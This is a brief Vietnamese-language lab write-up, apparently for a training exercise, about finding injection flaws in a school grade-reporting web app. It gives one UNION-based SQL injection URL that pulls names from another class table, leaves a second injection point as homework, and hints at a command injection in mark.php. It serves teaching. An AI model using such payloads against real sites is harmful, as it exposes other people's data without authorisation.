# Write-up

## 1. SQL Injection:

- Chỗ thứ nhất: `<URL>/mark_report.php?classID=IA1501+UNION+SELECT+id,%20fullname+FROM+IA1502;`

![image](https://user-images.githubusercontent.com/61876488/220874057-ef594397-fe7e-422e-90d6-c3f71d3fa5bd.png)

Giải thích: đọc về lệnh [UNION trong SQL] và đọc code 40 file `cmdsqli/markreport.php`.

![image](https://user-images.githubusercontent.com/61876488/220873994-ae6a7423-0760-458c-bc08-af79c924f0b2.png)


- Chỗ thứ 2: bài tập về nhà, tự tìm.

## 2. Command Injection:

- Hint: đọc code dòng 3 file `mark.php`.
